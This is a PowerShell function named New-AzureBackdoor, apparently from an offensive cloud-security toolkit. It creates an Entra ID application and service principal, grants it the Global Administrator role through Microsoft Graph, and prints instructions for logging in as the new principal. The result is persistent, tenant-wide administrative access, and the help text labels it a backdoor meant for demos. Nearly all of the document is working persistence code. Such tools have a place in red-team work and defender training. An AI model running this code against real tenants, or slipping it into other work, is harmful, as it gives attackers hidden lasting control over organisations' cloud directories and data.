function New-AzureBackdoor {
    <#
    .SYNOPSIS
        Creates a backdoor by creating a service principal and making it a Global Administrator.

    .DESCRIPTION
        USE WITH CAUTION! ONLY FOR DEMO PURPOSES.
        This function creates a service principal and assigns it the Global Administrator role. This allows you to login as the service principal and perform administrative tasks in Entra ID.

    .PARAMETER Username 
        The name of the service principal to be created.

    .PARAMETER Password 
        The password for the service principal.

    .EXAMPLE
        New-AzureBackdoor -Username 'testserviceprincipal' -Password 'Password!'
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true)][String]$Username,
        [Parameter(Mandatory = $true)][String]$Password
    )

    # Step 1: Authenticate with Microsoft Graph
    Write-Host "Authenticating with Microsoft Graph..." -ForegroundColor Cyan
    Connect-MgGraph -Scopes "Directory.ReadWrite.All", "RoleManagement.ReadWrite.Directory", "Application.ReadWrite.All"

    # Step 2: Create an Entra ID application and service principal
    Write-Host "Creating Entra ID application and service principal..." -ForegroundColor Cyan

    # Construct password credentials
    $PasswordCredential = @{
        DisplayName    = $Username
        SecretText     = $Password
        StartDateTime  = (Get-Date).ToString("o")  # ISO 8601 format
        EndDateTime    = (Get-Date).AddYears(1).ToString("o")
    }

    # Create Entra ID application
    $App = New-MgApplication -DisplayName $Username

    if (-not $App.Id) {
        Write-Error "Failed to create Entra ID application."
        return
    }

    # Create service principal for the application
    $ServicePrincipal = New-MgServicePrincipal -AppId $App.AppId

    if (-not $ServicePrincipal.Id) {
        Write-Error "Failed to create service principal for the application."
        return
    }

    Write-Host "Service principal created successfully. Assigning Global Administrator role..." -ForegroundColor Cyan

    # Step 3: Assign Global Administrator role
    $roleName = "Global Administrator"
    $role = Get-MgDirectoryRole | Where-Object {$_.displayName -eq $roleName}

    # Construct parameters for New-MgDirectoryRoleMemberByRef
    $params = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($ServicePrincipal.Id)"
    }

    try {
        # Assign the role
        New-MgDirectoryRoleMemberByRef -DirectoryRoleId $role.id -BodyParameter $params
        Write-Host "Global Administrator role successfully assigned to the service principal." -ForegroundColor Green
    } catch {
        Write-Error "Failed to assign Global Administrator role to the service principal. Error: $_"
    }

    # Step 4: Output login instructions
    Write-Host ""
    Write-Host "You can now login as the service principal using the following commands:" -ForegroundColor Green
    Write-Host ""
    Write-Host '$Credential = Get-Credential; Connect-AzAccount -Credential $Credential -Tenant <TenantId> -ServicePrincipal' -ForegroundColor Yellow
    Write-Host "Be sure to use the Application ID as the username when prompted by Get-Credential. The application ID is: $($App.AppId)" -ForegroundColor Yellow
}
